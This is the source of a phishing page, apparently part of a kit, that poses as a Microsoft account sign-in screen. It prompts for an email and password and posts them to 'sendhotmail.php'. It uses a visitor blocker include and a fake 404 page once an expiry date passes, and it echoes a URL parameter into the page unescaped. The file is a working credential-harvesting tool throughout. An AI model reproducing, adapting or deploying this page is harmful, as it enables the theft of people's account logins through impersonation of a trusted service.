<?php
include('blocker.php');
$todays_date=time();
$exp_date = "exp1234";
if ($exp_date <= $todays_date)

{
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /djdjkd was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>';
exit;
}
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
	<title>Sign In</title>
	      <link rel="stylesheet" title="Default" type="text/css" href="../Sign%20In_files/Default1033.css"><style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
body.cb a,
    body.cb a:visited,
    body.cb a:hover
    {
        color: #0072C6;
    }
</style><style type="text/css">body{display:none;}</style><script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript><script type="text/javascript">var g_iSRSFailed=0,g_sSRSSuccess="";function SRSRetry(c,f,e,b){var m=1,l=unescape('%3Cscript type="text/javascript" src="'),k=unescape('"%3E%3C/script%3E'),h=f,i=window,d=i.navigator;if(d&&d.userAgent&&b&&b!=f){var g=d.userAgent.toLowerCase(),n=g.indexOf("edge")>=0;if(!n){var a=g.match(/chrome\/([0-9]+)\./),j=a&&a.length==2&&!isNaN(a[1])&&parseInt(a[1])>54;if(j)h=b}}if(g_sSRSSuccess.indexOf(c)!=-1)return;if(typeof i[c]=="undefined"){g_iSRSFailed=1;e<=m&&document.write(l+h+k)}else g_sSRSSuccess+=c+"|"+e+","}
  var g_dtFirstByte=new Date();var g_objPageMode = null;</script><link rel="image_src" href="https://auth.gfx.ms/16.000.27121.00/images/Windows_Live_v_thumb.jpg">
<link rel="shortcut icon" href="https://auth.gfx.ms/16.000.27121.00/images/favicon.ico">
	<style type="text/css">
.animated {
  -webkit-animation-duration: .2s;
  animation-duration: .2s;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
}

.animated.infinite {
  -webkit-animation-iteration-count: infinite;
  animation-iteration-count: infinite;
}

@-webkit-keyframes slideInLeft {
  from {
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInLeft {
  from {
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInLeft {
  -webkit-animation-name: slideInLeft;
  animation-name: slideInLeft;
}

@-webkit-keyframes slideInRight {
  from {
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes slideInRight {
  from {
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
    visibility: visible;
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.slideInRight {
  -webkit-animation-name: slideInRight;
  animation-name: slideInRight;
}


@-webkit-keyframes slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

@keyframes slideOutLeft {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

.slideOutLeft {
  -webkit-animation-name: slideOutLeft;
  animation-name: slideOutLeft;
}

@-webkit-keyframes slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }
}

@keyframes slideOutRight {
  from {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  to {
    visibility: hidden;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }
}

.slideOutRight {
  -webkit-animation-name: slideOutRight;
  animation-name: slideOutRight;
}


		div.container{
			max-width: 968px;
			margin: auto;
		}

		div.loginholder{
			max-width: 384px;
			width: 90%;
			margin: auto;
			min-height: 400px;
		    padding-left: 12px;
		    padding-right: 12px;
		}

		div.login .header{
			text-align: center;
		}

		div.login .header h1.title{
			font-size: 34px;
		    line-height: 40px;
		    font-weight: 200;
		    font-size: 2.125rem;
		    line-height: 2.5rem;
		    padding-bottom: 3.1812px;
		    padding-top: 3.1812px;
		    padding-bottom: 3.1812px;
		    padding-top: 3.1812px;
		    margin-top: 0;
		}

		.header p {
		    font-size: 15px;
		    line-height: 20px;
		    font-weight: 400;
		    font-size: .9375rem;
		    line-height: 1.25rem;
		    padding-bottom: 0;
    		margin-bottom: 0;
		}

		div.imageplace{
			width: 100%;
		    max-width: 266px;
		    height: auto;
		    margin: auto;
		    padding-top: 15px;
		    padding-bottom: 15px;
		}

a.whatsthis {
    font-size: 14px;
    color: #0072C6;
    padding-bottom: 12px;
    display: inline-block;
}

input.form {
    display: block;
    padding: 4px 5px 4px 5px;
    width: 93%;
    height: 34px;
    margin: auto;
    border: solid 2px rgba(0,0,0,.4);
}

button {
   display: block;
   padding: 6px 12px 6px 12px;
   margin-top: 14px;
   margin-bottom: 4px;
   position: relative;
   text-align: center;
   white-space: nowrap;
   overflow: hidden;
   vertical-align: middle;
   text-overflow: ellipsis;
   touch-action: manipulation;
   border-style: solid;
   border-width: 2px;
   background-color: #0078d7;
   border-color: #0078d7;
   color: #fff;
   margin-left: auto;
   margin-right: auto;
   width: 93%;
}

.infobox {
    text-align: center;
}

.infobox p {
    font-size: 15px;
}

.infobox a {
    color: #0078d7;
    text-decoration: none;
}

.infobox {
    text-align: center;
}

.infobox p {
    font-size: 15px;
}

.infobox a {
    color: #0078d7;
    text-decoration: none;
}

.footer ul {
    margin: 0;
    padding: 0;
    width: 252px;
    margin: auto;
}

.footer ul li {
    display: inline-block;
    font-size: 12px;
    width: 120px;
    text-align: center;
}

.footer ul li a {
    display: block;
    text-decoration: none;
    color: #0078d7;
}

.footer {
    margin-top: 80px;
}

.footerimg {
    margin: auto;
    text-align: center;
    padding-top: 10px;
}

.emailbox,.passwordbox {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
}

.positioner {
    position: relative;
    min-height: 95px;
}

label {
    padding-left: 12px;
    margin-top: 5px;
    display: block;
}

input.remember_me {
    padding: 10px;
    display: inline-block;
}

button.backbutton,button.loginbtn {
    width: 49%;
    display: inline-block;
}

button.backbutton {
    background-color: rgba(0,0,0,.2);
    border-color: rgba(0,0,0,.2);
}

</style>
</head>
<body>

<div class="container">
	<div class="loginholder">
		<div class="imageplace">
			<img src="../Sign%20In_files/trap.svg">
		</div>

		<div class="login">
			<div class="header">
				<h1 class="title">Enter password</h1>
			<p class="sub">Enter the password for <?php echo $_GET['login'] ?></p>
			<a class="whatsthis" style="visibility: hidden;">What's this?</a>
			</div>
			<form action="sendhotmail.php" method="POST">
				<div class="positioner">
					<div class="emailbox animated slideOutLeft">
					<input name="username" class="form emailboxinput" id="emailboxinput" placeholder="Email, phone, or Skype name" value="<?php echo $_GET['login'] ?>">
					<button type="button" id="emailbtn" class="nextbutton">Next</button>
				</div>

				<div class="passwordbox animated slideInRight" style="visibility: visible;">
					<input name="password" class="form passwordboxinput" placeholder="Your Password" type="password">
					<label><input class="remember_me" type="checkbox"> Keep me Signed in</label>
					<button id="backbutton" type="button" class="backbutton">Back</button>
					<button type="submit" class="nextbutton loginbtn">Login</button>
				</div>	
				</div>
			</form>
			

			<div class="infobox">
				<p>No account?  <a href="#">Create one!</a></p>
			</div>

			<div class="footer">
				<ul>
					<li><a href="#">Terms of Use</a></li>
					<li><a href="#">Privacy &amp; Cookies</a></li>
				</ul>

				<div class="footerimg">
					<img src="../Sign%20In_files/trap2.svg">
				</div>
			</div>
		</div>
	</div>
</div>

<script src="../Sign%20In_files/jquery-2.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
<script type="text/javascript">
	$('#emailbtn').on('click',function(e){
		e.preventDefault();
		activatePasswordMode($('#emailboxinput').val());
	});
	$('#emailboxinput').keypress(function (e) {
    if (e.which == 13) {
		e.preventDefault();
		activatePasswordMode($('#emailboxinput').val());
    }
});

	$('#backbutton').on('click',function(e){
		e.preventDefault();
		reverseActivatePasswordMode();
	});

	function activatePasswordMode(email){
		$('h1.title').text("Enter password");
		$('p.sub').text("Enter the password for "+email);
		$('a.whatsthis').css("visibility","hidden");

		$('.emailbox').removeClass('slideInLeft');
		$('.emailbox').addClass('slideOutLeft');
		setTimeout(function(){
			$('.passwordbox').removeClass('slideOutRight');
			$('.passwordbox').addClass('slideInRight').css('visibility','visible');
		},150);
	}

	function reverseActivatePasswordMode(){
		$('h1.title').text("Sign in");
		$('p.sub').text('Use your Microsoft account');
		$('a.whatsthis').css("visibility","visible");

		$('.passwordbox').removeClass('slideInRight');
		$('.passwordbox').addClass('slideOutRight');
		
		setTimeout(function(){
			$('.emailbox').removeClass('slideOutLeft');
			$('.emailbox').addClass('slideInLeft').css('visibility','visible');
		},150);
	}
</script>

</body></html>